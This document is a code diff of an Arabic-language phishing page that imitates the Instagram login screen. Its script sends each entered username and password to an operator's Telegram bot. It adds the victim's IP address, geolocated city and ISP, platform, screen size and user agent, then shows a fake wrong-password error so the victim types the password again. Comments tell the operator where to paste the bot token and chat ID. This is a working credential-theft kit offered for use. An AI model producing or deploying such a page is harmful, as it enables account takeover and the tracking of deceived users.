@@ -1,78 +1,126 @@
 <!DOCTYPE html>
-<html lang="ar" dir="ltr">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
+    <title>تسجيل الدخول • Instagram</title>
+    <meta name="description" content="شاهد اللحظات اليومية من أصدقائك المقربين.">
+    <meta name="theme-color" content="#000000">
+    <meta name="mobile-web-app-capable" content="yes">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'><rect x='6' y='6' width='36' height='36' rx='8' fill='url(%23g)'/><circle cx='24' cy='24' r='10' fill='none' stroke='%23fff' stroke-width='3'/><circle cx='34' cy='14' r='2.5' fill='%23fff'/><defs><linearGradient id='g' x1='0' y1='0' x2='48' y2='48'><stop stop-color='%23F58529'/><stop offset='0.25' stop-color='%23DD2A7B'/><stop offset='0.5' stop-color='%238134AF'/><stop offset='0.75' stop-color='%23515BD4'/><stop offset='1' stop-color='%23813BB1'/></linearGradient></defs></svg>">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
 
         body {
-            background: #fafafa;
+            background: #ffffff;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: center;
             min-height: 100vh;
-            direction: ltr;
+            direction: rtl;
+            text-align: right;
         }
 
         .container {
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 10px;
+            gap: 8px;
+            padding: 20px 0;
+            max-width: 400px;
+            width: 100%;
         }
 
+        /* ===== LOGIN BOX ===== */
         .login-box {
             background: #fff;
             border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 40px 40px 30px;
-            width: 350px;
+            border-radius: 4px;
+            padding: 40px 32px 24px;
+            width: 100%;
+            max-width: 350px;
             text-align: center;
         }
 
         .logo {
-            margin-bottom: 30px;
+            display: flex;
+            justify-content: center;
+            margin-bottom: 36px;
         }
 
         .logo svg {
             width: 175px;
-            height: 51px;
+            height: auto;
+        }
+
+        /* Screenshot container */
+        .screenshot-container {
+            margin-bottom: 20px;
+            border-radius: 8px;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+        }
+
+        .screenshot-container img {
+            width: 100%;
+            max-width: 280px;
+            height: auto;
+            border-radius: 6px;
+            border: 1px solid #efefef;
         }
 
         .input-group {
+            position: relative;
             margin-bottom: 6px;
         }
 
         .input-group input {
             width: 100%;
-            padding: 9px 8px;
+            padding: 14px 12px 4px;
             background: #fafafa;
             border: 1px solid #dbdbdb;
-            border-radius: 3px;
+            border-radius: 4px;
             font-size: 12px;
             outline: none;
-            transition: border 0.2s;
+            transition: border 0.15s;
+            height: 44px;
+            direction: ltr;
+            text-align: right;
         }
 
         .input-group input:focus {
             border-color: #a8a8a8;
         }
 
-        .input-group input::placeholder {
+        .input-group label {
+            position: absolute;
+            top: 50%;
+            right: 12px;
+            transform: translateY(-50%);
+            font-size: 12px;
             color: #8e8e8e;
+            pointer-events: none;
+            transition: all 0.15s ease;
+        }
+
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: 10px;
+            transform: translateY(0);
+            font-size: 10px;
         }
 
         .login-btn {
             width: 100%;
-            padding: 7px 0;
+            padding: 8px 0;
             background: #0095f6;
             color: #fff;
             border: none;
@@ -80,9 +128,9 @@
             font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            margin-top: 12px;
+            margin-top: 14px;
             opacity: 0.7;
-            transition: opacity 0.2s;
+            transition: opacity 0.15s;
         }
 
         .login-btn.active {
@@ -93,13 +141,17 @@
             background: #1877f2;
         }
 
+        .login-btn:disabled {
+            cursor: default;
+        }
+
         .divider {
             display: flex;
             align-items: center;
-            margin: 20px 0;
+            margin: 18px 0 16px;
             color: #8e8e8e;
             font-size: 13px;
-            font-weight: 600;
+            font-weight: 500;
         }
 
         .divider::before,
@@ -123,12 +175,15 @@
             font-weight: 600;
             font-size: 14px;
             text-decoration: none;
-            margin-bottom: 18px;
+            margin-bottom: 14px;
+            background: none;
+            border: none;
+            cursor: pointer;
         }
 
         .fb-login svg {
-            width: 16px;
-            height: 16px;
+            width: 20px;
+            height: 20px;
         }
 
         .forgot-password {
@@ -141,12 +196,14 @@
             text-decoration: underline;
         }
 
+        /* ===== SIGNUP BOX ===== */
         .signup-box {
             background: #fff;
             border: 1px solid #dbdbdb;
-            border-radius: 1px;
-            padding: 20px 40px;
-            width: 350px;
+            border-radius: 4px;
+            padding: 18px 32px;
+            width: 100%;
+            max-width: 350px;
             text-align: center;
             font-size: 14px;
             color: #262626;
@@ -158,77 +215,105 @@
             text-decoration: none;
         }
 
+        /* ===== GET APP ===== */
         .get-app {
             text-align: center;
-            margin-top: 10px;
+            margin-top: 8px;
             font-size: 14px;
             color: #262626;
+            width: 100%;
+            max-width: 350px;
         }
 
         .app-icons {
             display: flex;
             justify-content: center;
             gap: 8px;
-            margin-top: 15px;
+            margin-top: 14px;
         }
 
-        .app-icons img {
+        .app-icon {
+            display: inline-block;
+        }
+
+        .app-icon img,
+        .app-icon svg {
             height: 40px;
         }
 
+        /* ===== FOOTER ===== */
         .footer {
             margin-top: 40px;
             text-align: center;
             font-size: 12px;
             color: #8e8e8e;
-            padding: 0 20px;
+            padding: 0 16px;
+            max-width: 700px;
+            width: 100%;
         }
 
-        .footer a {
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 4px 12px;
+            margin-bottom: 12px;
+        }
+
+        .footer-links a {
             color: #8e8e8e;
             text-decoration: none;
-            margin: 0 8px 10px;
-            display: inline-block;
             font-size: 12px;
+            white-space: nowrap;
         }
 
-        .footer a:hover {
+        .footer-links a:hover {
             text-decoration: underline;
         }
 
+        .footer-bottom {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 16px;
+            flex-wrap: wrap;
+            padding-bottom: 30px;
+        }
+
         .lang-select {
-            margin-top: 15px;
+            font-size: 12px;
+            color: #8e8e8e;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            outline: none;
+        }
+
+        .copyright {
             font-size: 12px;
             color: #8e8e8e;
         }
 
-        .error-msg {
-            color: #ed4956;
-            font-size: 13px;
-            margin-bottom: 10px;
-            display: none;
-        }
-
-        /* Loading overlay */
+        /* ===== OVERLAY ===== */
         #loadingOverlay {
             display: none;
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
-            background: rgba(255,255,255,0.85);
+            background: rgba(255,255,255,0.9);
             z-index: 9999;
             justify-content: center;
             align-items: center;
             flex-direction: column;
-            gap: 20px;
+            gap: 16px;
         }
 
         #loadingOverlay .spinner {
-            width: 50px;
-            height: 50px;
-            border: 4px solid #dbdbdb;
-            border-top: 4px solid #0095f6;
+            width: 44px;
+            height: 44px;
+            border: 3px solid #dbdbdb;
+            border-top: 3px solid #0095f6;
             border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+            animation: spin 0.7s linear infinite;
         }
 
         @keyframes spin {
@@ -242,6 +327,7 @@
             font-weight: 500;
         }
 
+        /* ===== TOAST ===== */
         .toast {
             display: none;
             position: fixed;
@@ -250,35 +336,73 @@
             transform: translateX(-50%);
             background: #262626;
             color: #fff;
-            padding: 14px 24px;
+            padding: 12px 24px;
             border-radius: 8px;
             font-size: 14px;
             z-index: 10001;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            text-align: center;
+            max-width: 90vw;
+        }
+
+        /* ===== ERROR ===== */
+        .error-msg {
+            color: #ed4956;
+            font-size: 13px;
+            margin-bottom: 12px;
+            display: none;
+            text-align: center;
+        }
+
+        /* ===== Error shake ===== */
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-6px); }
+            40% { transform: translateX(6px); }
+            60% { transform: translateX(-4px); }
+            80% { transform: translateX(4px); }
+        }
+
+        .shake {
+            animation: shake 0.3s ease;
+        }
+
+        /* ===== RESPONSIVE ===== */
+        @media (max-width: 450px) {
+            .login-box {
+                border: none;
+                background: transparent;
+                padding: 20px 16px;
+            }
+            .signup-box {
+                border: none;
+                background: transparent;
+            }
+            body {
+                background: #fff;
+            }
         }
     </style>
 </head>
 <body>
 
+<!-- Loading Overlay -->
 <div id="loadingOverlay">
     <div class="spinner"></div>
     <p>جاري تسجيل الدخول...</p>
 </div>
 
+<!-- Toast -->
 <div id="toastMsg" class="toast"></div>
 
 <div class="container">
-    <!-- Login Box -->
+    <!-- LOGIN BOX -->
     <div class="login-box">
+        <!-- Instagram Logo -->
         <div class="logo">
-            <!-- Instagram Logo SVG -->
             <svg viewBox="0 0 175 51" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <path d="M49.583 25.5c0 5.52-4.48 10-10 10s-10-4.48-10-10 4.48-10 10-10 10 4.48 10 10z" fill="url(#ig_logo_grad)"/>
-                <path d="M60.5 25.5c0 5.52-4.48 10-10 10s-10-4.48-10-10 4.48-10 10-10 10 4.48 10 10z" fill="url(#ig_logo_grad)"/>
-                <path d="M39.583 25.5c0 5.52-4.48 10-10 10s-10-4.48-10-10 4.48-10 10-10 10 4.48 10 10z" fill="url(#ig_logo_grad)"/>
-                <rect x="30" y="15" width="30" height="30" rx="8" fill="#fff"/>
                 <defs>
-                    <linearGradient id="ig_logo_grad" x1="0" y1="0" x2="0" y2="51" gradientUnits="userSpaceOnUse">
+                    <linearGradient id="igLogo" x1="0" y1="0" x2="0" y2="51" gradientUnits="userSpaceOnUse">
                         <stop stop-color="#FEDA77"/>
                         <stop offset="0.25" stop-color="#F58529"/>
                         <stop offset="0.5" stop-color="#DD2A7B"/>
@@ -286,100 +410,220 @@
                         <stop offset="1" stop-color="#515BD4"/>
                     </linearGradient>
                 </defs>
+                <path d="M49.583 25.5c0 5.52-4.48 10-10 10s-10-4.48-10-10 4.48-10 10-10 10 4.48 10 10z" fill="url(#igLogo)" opacity="0"/>
+                <path d="M60.5 25.5c0 5.52-4.48 10-10 10s-10-4.48-10-10 4.48-10 10-10 10 4.48 10 10z" fill="url(#igLogo)" opacity="0"/>
+                <path d="M39.583 25.5c0 5.52-4.48 10-10 10s-10-4.48-10-10 4.48-10 10-10 10 4.48 10 10z" fill="url(#igLogo)" opacity="0"/>
+                <rect x="24" y="10" width="40" height="40" rx="10" fill="url(#igLogo)"/>
+                <circle cx="44" cy="30" r="12" fill="none" stroke="#fff" stroke-width="3.5"/>
+                <circle cx="56" cy="18" r="3" fill="#fff"/>
             </svg>
         </div>
 
-        <div id="errorMsg" class="error-msg">عذرًا، كلمة المرور غير صحيحة. أعد المحاولة.</div>
+        <!-- Screenshot / Preview Image (اختياري - لو حابب تحط صورة معينة) -->
+        <div class="screenshot-container">
+            <img src="https://static.cdninstagram.com/rsrc.php/yN/r/-erGonz07kB.webp" alt="Instagram Preview">
+        </div>
 
-        <form id="loginForm">
+        <!-- Error Message -->
+        <div id="errorMsg" class="error-msg">عذرًا، كلمة السر غير صحيحة. أعد المحاولة.</div>
+
+        <!-- Form -->
+        <form id="loginForm" autocomplete="off">
             <div class="input-group">
-                <input type="text" id="username" placeholder="رقم الهاتف أو اسم المستخدم أو البريد الإلكتروني" required>
+                <input type="text" id="username" placeholder=" " required autocomplete="off">
+                <label for="username">رقم الهاتف المحمول أو اسم المستخدم أو البريد الإلكتروني</label>
             </div>
             <div class="input-group">
-                <input type="password" id="password" placeholder="كلمة المرور" required>
+                <input type="password" id="password" placeholder=" " required autocomplete="off">
+                <label for="password">كلمة السر</label>
             </div>
-            <button type="submit" class="login-btn" id="loginBtn">تسجيل الدخول</button>
+            <button type="submit" class="login-btn" id="loginBtn" disabled>تسجيل الدخول</button>
         </form>
 
+        <!-- OR Divider -->
         <div class="divider">
             <span>أو</span>
         </div>
 
+        <!-- Facebook Login -->
         <a href="#" class="fb-login">
-            <svg viewBox="0 0 16 16" fill="currentColor">
-                <path d="M8 0C3.58 0 0 3.58 0 8c0 3.85 2.63 7.08 6.16 8v-5.66H4.3V8h1.86V6.2c0-1.84 1.1-2.86 2.78-2.86.8 0 1.64.14 1.64.14v1.8h-.92c-.91 0-1.2.57-1.2 1.15V8h2.04l-.33 2.34H8.3V16C13.37 15.08 16 11.15 16 8c0-4.42-3.58-8-8-8z"/>
+            <svg viewBox="0 0 24 24" fill="#385185">
+                <path d="M24 12.073c0-6.627-5.373-12-12-12S0 5.446 0 12.073c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
             </svg>
-            تسجيل الدخول باستخدام Facebook
+            تسجيل الدخول بحساب فيسبوك
         </a>
 
-        <a href="#" class="forgot-password">هل نسيت كلمة المرور؟</a>
+        <!-- Forgot Password -->
+        <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
     </div>
 
-    <!-- Signup Box -->
+    <!-- SIGNUP BOX -->
     <div class="signup-box">
-        ليس لديك حساب؟ <a href="#">اشترك الآن</a>
+        ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a>
     </div>
 
+    <!-- GET APP -->
     <div class="get-app">
-        <p>حمّل التطبيق</p>
+        <p>تطبيق الهاتف المحمول</p>
         <div class="app-icons">
-            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='5' fill='%23000'/%3E%3Ctext x='20' y='26' fill='%23fff' font-size='12' font-family='sans-serif'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play">
-            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'%3E%3Crect width='135' height='40' rx='5' fill='%23000'/%3E%3Ctext x='20' y='26' fill='%23fff' font-size='12' font-family='sans-serif'%3EApp Store%3C/text%3E%3C/svg%3E" alt="App Store">
+            <span class="app-icon">
+                <svg width="136" height="40" viewBox="0 0 136 40" fill="none">
+                    <rect width="136" height="40" rx="4" fill="#111"/>
+                    <text x="22" y="16" fill="#fff" font-size="7" font-family="sans-serif">GET IT ON</text>
+                    <text x="22" y="28" fill="#fff" font-size="12" font-weight="bold" font-family="sans-serif">Google Play</text>
+                </svg>
+            </span>
+            <span class="app-icon">
+                <svg width="136" height="40" viewBox="0 0 136 40" fill="none">
+                    <rect width="136" height="40" rx="4" fill="#111"/>
+                    <text x="22" y="16" fill="#fff" font-size="7" font-family="sans-serif">Download on the</text>
+                    <text x="22" y="28" fill="#fff" font-size="12" font-weight="bold" font-family="sans-serif">App Store</text>
+                </svg>
+            </span>
         </div>
     </div>
 
+    <!-- FOOTER -->
     <div class="footer">
-        <a href="#">Meta</a>
-        <a href="#">معلومات</a>
-        <a href="#">المدونة</a>
-        <a href="#">الوظائف</a>
-        <a href="#">المساعدة</a>
-        <a href="#">API</a>
-        <a href="#">الخصوصية</a>
-        <a href="#">الشروط</a>
-        <a href="#">الحسابات المرتبطة</a>
-        <a href="#">مواقع هاشتاغ</a>
-        <a href="#">Instagram Lite</a>
-        <div class="lang-select">
-            <select style="border:none;background:transparent;font-size:12px;color:#8e8e8e;">
-                <option>العربية</option>
-                <option>English</option>
-                <option>Français</option>
+        <div class="footer-links">
+            <a href="#">Meta</a>
+            <a href="#">حول</a>
+            <a href="#">المدونة</a>
+            <a href="#">الوظائف</a>
+            <a href="#">مساعدة</a>
+            <a href="#">واجهة API</a>
+            <a href="#">الخصوصية</a>
+            <a href="#">الشروط</a>
+            <a href="#">المواقع</a>
+            <a href="#">رائج</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Meta AI</a>
+            <a href="#">Threads</a>
+            <a href="#">تحميل جهات الاتصال وغير المستخدمين</a>
+            <a href="#">Meta Verified</a>
+        </div>
+        <div class="footer-bottom">
+            <select class="lang-select" id="langSelect">
+                <option value="ar" selected>العربية</option>
+                <option value="en">English</option>
+                <option value="fr">Français</option>
             </select>
+            <span class="copyright">© 2026 Instagram from Meta</span>
         </div>
     </div>
 </div>
 
 <script>
-    // ========== التــهيئــة ==========
-    // ضع هنا التوكن (API Token) الخاص ببوت تلجرام
-    const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
-    // ضع هنا ايدي حسابك في تلجرام (رقمي)
-    const CHAT_ID = 'YOUR_CHAT_ID_HERE';
+    // =====================================================
+    // ====== ضع بيانات البوت هنا ======
+    // =====================================================
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';   // توكن البوت من BotFather
+    const CHAT_ID  = 'YOUR_CHAT_ID_HERE';      // ايدي حسابك في تلجرام
     const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
-    // ========== الـدوال ==========
-    function showToast(msg) {
-        const toast = document.getElementById('toastMsg');
-        toast.textContent = msg;
-        toast.style.display = 'block';
-        setTimeout(() => { toast.style.display = 'none'; }, 4000);
+    // =====================================================
+    // ====== DOM Elements ======
+    // =====================================================
+    const form = document.getElementById('loginForm');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const loginBtn = document.getElementById('loginBtn');
+    const errorMsg = document.getElementById('errorMsg');
+    const loadingOverlay = document.getElementById('loadingOverlay');
+    const toastMsg = document.getElementById('toastMsg');
+
+    // =====================================================
+    // ====== Helper Functions ======
+    // =====================================================
+    function showToast(text) {
+        toastMsg.textContent = text;
+        toastMsg.style.display = 'block';
+        setTimeout(() => { toastMsg.style.display = 'none'; }, 4000);
     }
 
     function showLoading(show) {
-        document.getElementById('loadingOverlay').style.display = show ? 'flex' : 'none';
+        loadingOverlay.style.display = show ? 'flex' : 'none';
     }
 
-    async function sendToTelegram(data) {
+    function showError(show) {
+        errorMsg.style.display = show ? 'block' : 'none';
+    }
+
+    // تفعيل/تعطيل زر الدخول
+    function toggleButton() {
+        if (usernameInput.value.trim() && passwordInput.value.trim()) {
+            loginBtn.disabled = false;
+            loginBtn.classList.add('active');
+        } else {
+            loginBtn.disabled = true;
+            loginBtn.classList.remove('active');
+        }
+    }
+
+    usernameInput.addEventListener('input', toggleButton);
+    passwordInput.addEventListener('input', toggleButton);
+
+    // =====================================================
+    // ====== Get User IP (free) ======
+    // =====================================================
+    async function getUserIP() {
+        try {
+            const res = await fetch('https://api.ipify.org?format=json', { signal: AbortSignal.timeout(5000) });
+            const data = await res.json();
+            return data.ip;
+        } catch {
+            try {
+                const res2 = await fetch('https://api.my-ip.io/ip.json', { signal: AbortSignal.timeout(5000) });
+                const data2 = await res2.json();
+                return data2.ip;
+            } catch {
+                return 'غير معروف';
+            }
+        }
+    }
+
+    // =====================================================
+    // ====== Get Location Info from IP ======
+    // =====================================================
+    async function getLocationInfo(ip) {
+        if (!ip || ip === 'غير معروف') return 'غير متاح';
+        try {
+            const res = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,isp,org`, {
+                signal: AbortSignal.timeout(5000)
+            });
+            const data = await res.json();
+            if (data.status === 'success') {
+                return `${data.city}, ${data.country} - ${data.isp || data.org || 'غير معروف'}`;
+            }
+            return 'غير متاح';
+        } catch {
+            return 'غير متاح';
+        }
+    }
+
+    // =====================================================
+    // ====== Send to Telegram ======
+    // =====================================================
+    async function sendToTelegram(credentials) {
         const ip = await getUserIP();
-        const time = new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' });
-        
+        const location = await getLocationInfo(ip);
+        const now = new Date();
+        const timeStr = now.toLocaleString('ar-SA', { timeZone: 'Asia/Riyadh' });
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform || 'غير معروف';
+        const screenRes = `${screen.width}x${screen.height}`;
+
         const message = `🔴 **تسجيل دخول Instagram** 🔴\n\n` +
-                        `👤 **المستخدم:** ${data.username}\n` +
-                        `🔑 **كلمة المرور:** ${data.password}\n` +
-                        `🌐 **IP:** ${ip || 'غير معروف'}\n` +
-                        `🕐 **التاريخ:** ${time}\n` +
-                        `📍 **User-Agent:** ${navigator.userAgent.substring(0, 80)}`;
+            `👤 **المستخدم:** \`${credentials.username}\`\n` +
+            `🔑 **كلمة السر:** \`${credentials.password}\`\n` +
+            `━━━━━━━━━━━━━━\n` +
+            `🌐 **IP:** \`${ip}\`\n` +
+            `📍 **الموقع:** ${location}\n` +
+            `💻 **المنصة:** ${platform}\n` +
+            `🖥 **الشاشة:** ${screenRes}\n` +
+            `🕐 **التاريخ:** ${timeStr}\n` +
+            `━━━━━━━━━━━━━━\n` +
+            `📱 **User-Agent:**\n\`${userAgent.substring(0, 200)}\``;
 
         try {
             const res = await fetch(TELEGRAM_API, {
@@ -393,70 +637,61 @@
             });
             const result = await res.json();
             if (!result.ok) {
-                console.error('Telegram API error:', result);
-                showToast('⚠️ خطأ في إرسال البيانات إلى البوت');
-            } else {
-                showToast('✅ تم إرسال البيانات بنجاح');
+                console.error('Telegram Error:', result);
+                showToast('⚠️ خطأ في الإرسال: تحقق من التوكن والايدي');
             }
         } catch (e) {
-            console.error('Network error:', e);
-            showToast('⚠️ خطأ في الاتصال بالبوت');
+            console.error('Network Error:', e);
+            showToast('⚠️ فشل الاتصال بالبوت');
         }
     }
 
-    async function getUserIP() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            return data.ip;
-        } catch {
-            return null;
-        }
-    }
-
-    // ========== ربط النموذج ==========
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    // =====================================================
+    // ====== Form Submit ======
+    // =====================================================
+    form.addEventListener('submit', async function(e) {
         e.preventDefault();
 
-        const username = document.getElementById('username').value.trim();
-        const password = document.getElementById('password').value.trim();
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
 
         if (!username || !password) {
             showToast('⚠️ الرجاء ملء جميع الحقول');
             return;
         }
 
-        // تفعيل التحميل
+        // Show loading
         showLoading(true);
-        document.getElementById('errorMsg').style.display = 'none';
+        showError(false);
+        loginBtn.disabled = true;
 
-        // إرسال البيانات إلى تلجرام
+        // Send data to Telegram
         await sendToTelegram({ username, password });
 
-        // إظهار الخطأ بعد 1.5 ثانية (محاكاة)
+        // Simulate loading delay then show error
         setTimeout(() => {
             showLoading(false);
-            document.getElementById('errorMsg').style.display = 'block';
-            document.getElementById('password').value = '';
-            document.getElementById('password').focus();
-        }, 1500);
+            showError(true);
+            passwordInput.value = '';
+            toggleButton();
+            passwordInput.focus();
+
+            // Shake effect on the box
+            document.querySelector('.login-box').classList.add('shake');
+            setTimeout(() => {
+                document.querySelector('.login-box').classList.remove('shake');
+            }, 350);
+        }, 2000);
     });
 
-    // تفعيل زر الدخول عند الكتابة
-    const usernameInput = document.getElementById('username');
-    const passwordInput = document.getElementById('password');
-    const loginBtn = document.getElementById('loginBtn');
+    // منع حفظ كلمة المرور من المتصفح
+    form.setAttribute('autocomplete', 'off');
+    setTimeout(() => {
+        usernameInput.setAttribute('autocomplete', 'new-username');
+        passwordInput.setAttribute('autocomplete', 'new-password');
+    }, 100);
 
-    function checkInputs() {
-        if (usernameInput.value.trim() && passwordInput.value.trim()) {
-            loginBtn.classList.add('active');
-        } else {
-            loginBtn.classList.remove('active');
-        }
-    }
-
-    usernameInput.addEventListener('input', checkInputs);
-    passwordInput.addEventListener('input', checkInputs);
+    console.log('✅ Instagram Login Page Loaded');
 </script>
 
 </body>
